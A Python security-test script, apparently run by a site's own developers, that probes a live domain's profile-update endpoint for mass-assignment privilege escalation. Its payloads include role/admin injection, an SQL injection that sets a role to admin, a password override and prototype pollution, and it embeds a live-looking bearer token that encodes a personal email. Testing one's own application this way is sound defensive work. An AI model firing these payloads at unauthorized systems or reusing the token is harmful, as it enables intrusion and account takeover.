#!/usr/bin/env python3
"""
DAST Advanced #3: Mass Assignment & Parameter Fuzzing
══════════════════════════════════════════════════════
Target : PUT /api/auth/profile (profile update endpoint)
Attack : Inject hidden admin parameters (role, status, is_admin, etc.)
         into the JSON body to escalate privileges
Goal   : Verify backend only accepts whitelisted fields

Expected if SECURE:   Extra fields silently ignored, role stays "user"
Expected if VULNERABLE: Role/status changes to injected value
"""

import requests
import json
import sys
import time

# ─── Configuration ──────────────────────────────────────────────────────────
TARGET = "https://livelinepcbn.com"
VALID_JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI5NmMxOGQ2Mi01ZmQ0LTRmMDYtOGYwMy05NjQ3ZTA0MTk0NzYiLCJlbWFpbCI6ImR1bmdkb25nMzMzQGdtYWlsLmNvbSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzc2MzA1OTA2LCJleHAiOjE3NzY5MTA3MDZ9.11Kqob-SnuxmryCEVF-Pa09GaO844C_9P6qTNzXyOlw"

HEADERS = {
    "Authorization": f"Bearer {VALID_JWT}",
    "Content-Type": "application/json",
}

# ─── Step 1: Baseline — get current profile ─────────────────────────────────
print("=" * 60)
print("  DAST #3 - Mass Assignment & Parameter Fuzzing")
print("=" * 60)
print()
print("Step 1: Getting current profile (baseline)...")
r = requests.get(f"{TARGET}/api/auth/me", headers=HEADERS, timeout=10)
if r.status_code != 200:
    print(f"  Failed: HTTP {r.status_code} — {r.text[:200]}")
    sys.exit(1)

baseline = r.json()
print(f"  User: {baseline.get('name')} ({baseline.get('email')})")
print(f"  Role: {baseline.get('role')}")
print(f"  Status: {baseline.get('status')}")
print()

# ─── Step 2: Privilege escalation payloads ──────────────────────────────────
PAYLOADS = [
    {
        "name": "Direct role escalation",
        "body": {"name": baseline.get("name"), "role": "admin"},
        "check_field": "role",
        "dangerous_value": "admin",
    },
    {
        "name": "Status bypass (force approved)",
        "body": {"name": baseline.get("name"), "status": "approved"},
        "check_field": "status",
        "dangerous_value": "approved",
    },
    {
        "name": "Role + status combo",
        "body": {"name": baseline.get("name"), "role": "admin", "status": "approved"},
        "check_field": "role",
        "dangerous_value": "admin",
    },
    {
        "name": "Password override via profile",
        "body": {"name": baseline.get("name"), "password": "hacked123"},
        "check_field": "role",  # just check it doesn't crash
        "dangerous_value": None,
    },
    {
        "name": "id override (impersonation)",
        "body": {"name": baseline.get("name"), "id": "1"},
        "check_field": "id",
        "dangerous_value": "1",
    },
    {
        "name": "is_admin flag injection",
        "body": {"name": baseline.get("name"), "is_admin": True, "isAdmin": True, "admin": True},
        "check_field": "role",
        "dangerous_value": "admin",
    },
    {
        "name": "email_verified bypass",
        "body": {"name": baseline.get("name"), "email_verified": True, "verified": True},
        "check_field": "role",
        "dangerous_value": None,
    },
    {
        "name": "created_at manipulation",
        "body": {"name": baseline.get("name"), "created_at": "2020-01-01T00:00:00Z", "createdAt": "2020-01-01"},
        "check_field": "role",
        "dangerous_value": None,
    },
    {
        "name": "SQL injection in name field",
        "body": {"name": "test'; UPDATE users SET role='admin' WHERE id='96c18d62-5fd4-4f06-8f03-9647e0419476'; --"},
        "check_field": "role",
        "dangerous_value": "admin",
    },
    {
        "name": "Prototype pollution via __proto__",
        "body": {"name": baseline.get("name"), "__proto__": {"role": "admin"}, "constructor": {"prototype": {"role": "admin"}}},
        "check_field": "role",
        "dangerous_value": "admin",
    },
]

passed = 0
failed = 0

print(f"Step 2: Firing {len(PAYLOADS)} escalation payloads...")
print()

for i, payload in enumerate(PAYLOADS, 1):
    name = payload["name"]
    body = payload["body"]
    check_field = payload["check_field"]
    dangerous_value = payload["dangerous_value"]

    print(f"  [{i:2d}/{len(PAYLOADS)}] {name}")
    print(f"       Payload: {json.dumps(body)[:120]}")

    try:
        r = requests.put(f"{TARGET}/api/auth/profile", headers=HEADERS, json=body, timeout=10)
        status = r.status_code

        if status >= 400:
            print(f"       Result: HTTP {status} — REJECTED (server blocked)")
            passed += 1
            continue

        # Check if the dangerous field was actually changed
        check_r = requests.get(f"{TARGET}/api/auth/me", headers=HEADERS, timeout=10)
        after = check_r.json()
        actual_value = after.get(check_field)

        if dangerous_value and actual_value == dangerous_value and actual_value != baseline.get(check_field):
            print(f"       Result: VULNERABLE! {check_field} changed to '{actual_value}'")
            failed += 1
        else:
            print(f"       Result: SECURE — {check_field}='{actual_value}' (unchanged)")
            passed += 1

    except Exception as e:
        print(f"       Result: ERROR — {e}")
        passed += 1

    time.sleep(0.3)  # Polite delay

# ─── Step 3: Restore original name ─────────────────────────────────────────
print()
print("Step 3: Restoring original profile...")
requests.put(f"{TARGET}/api/auth/profile", headers=HEADERS,
             json={"name": baseline.get("name"), "bio": baseline.get("bio", "")}, timeout=10)

# ─── Final Verification ────────────────────────────────────────────────────
print()
print("Step 4: Final verification...")
r = requests.get(f"{TARGET}/api/auth/me", headers=HEADERS, timeout=10)
final = r.json()
print(f"  Role: {final.get('role')} (should be '{baseline.get('role')}')")
print(f"  Status: {final.get('status')} (should be '{baseline.get('status')}')")

print(f"""
============== RESULTS ==============
  Total payloads: {len(PAYLOADS)}
  Passed:         {passed}
  Failed:         {failed}

{"  VERDICT: SECURE" if failed == 0 else f"  VERDICT: VULNERABLE — {failed} escalation(s) succeeded!"}
{"  Backend uses explicit field whitelist — extra params ignored." if failed == 0 else "  Fix: Use explicit field destructuring, not spread operator."}
""")
